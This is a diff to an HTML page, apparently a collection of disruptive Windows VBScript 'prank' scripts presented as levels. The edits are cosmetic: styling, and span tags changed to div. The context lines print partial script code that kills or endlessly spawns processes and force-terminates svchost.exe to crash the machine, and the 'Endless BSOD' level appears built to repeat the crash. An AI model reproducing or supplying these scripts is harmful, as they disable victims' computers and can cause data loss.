@@ -11,7 +11,9 @@
   .code {
     background-color: grey;
     color: white;
-    font-family: Lato
+    font-family: Lato;
+    width: 200px;
+    height: 200px;
   }
 
   ul {
@@ -42,7 +44,7 @@
 </ul>
 <br>
 <h1>Level 1 (Unopenable Notepad):</h1>
-<span class="code">
+<div class="code">
 Dim objShell, objWMIService, colProcesses<br>
 <br>
 Set objShell = CreateObject("WScript.Shell")<br>
@@ -62,10 +64,10 @@ Do<br>
         End If<br>
     End If<br>
 Loop<br>
-</span>
+</div>
 
 <h1>Level 2 (Application Bomber):</h1>
-<span class="code">
+<div class="code">
 Dim objShell<br>
 Set objShell = CreateObject("WScript.Shell")<br>
 <br>
@@ -80,10 +82,10 @@ Do<br>
     objShell.Run "explorer"<br>
     objShell.Run "control"<br>
 Loop<br>
-</span>
+</div>
 
 <h1>Level 5 (Command Prompt BSOD):</h1>
-<span class="code">
+<div class="code">
 Dim shell, I<br>
 <br>
 Set shell = CreateObject("WScript.Shell")<br>
@@ -95,10 +97,10 @@ For I = 1 To 20<br>
 Next<br>
 <br>
 shell.Run "taskkill /f /im svchost.exe"<br>
-</span>
+</div>
 
 <h1>Level 15 (Endless BSOD):</h1>
-<span class="code">
+<div class="code">
 Dim shell, FSO<br>
 <br>
 Set shell = CreateObject("WScript.Shell")<br>
@@ -117,5 +119,5 @@ OutPutFile.Close<br>
 <br>
 Set FSO = Nothing<br>
 shell.Run "taskkill /f /im svchost.exe"<br>
-</span>
+</div>
 </center>
